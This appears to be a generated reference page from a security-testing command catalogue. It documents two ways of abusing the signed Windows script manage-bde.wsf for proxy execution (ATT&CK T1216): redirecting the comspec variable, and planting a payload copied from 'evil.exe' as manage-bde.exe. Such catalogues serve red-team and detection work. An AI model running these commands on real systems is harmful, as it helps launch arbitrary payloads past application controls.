---
parsed_by: focuslocust
source: commands
type: generated
---
# Manage-bde.wsf Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Manage-bde.wsf

Tool page: [Manage-bde.wsf](../../tools/windows/manage-bde.wsf.md)

### Proxy execution from script

```text
set comspec={PATH_ABSOLUTE:.exe} & cscript c:\windows\system32\manage-bde.wsf
```

Description:

Set the comspec variable to another executable prior to calling manage-bde.wsf for execution.

Related ATT&CK:

- [T1216](../../attack/techniques/T1216-system-script-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSScripts/Manage-bde.yml` |
| Evidence | Command preserved from source parser. |

### Proxy execution from script

```text
copy c:\users\person\evil.exe c:\users\public\manage-bde.exe & cd c:\users\public\ & cscript.exe c:\windows\system32\manage-bde.wsf
```

Description:

Run the manage-bde.wsf script with a payload named manage-bde.exe in the same directory to run the payload file.

Related ATT&CK:

- [T1216](../../attack/techniques/T1216-system-script-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSScripts/Manage-bde.yml` |
| Evidence | Command preserved from source parser. |
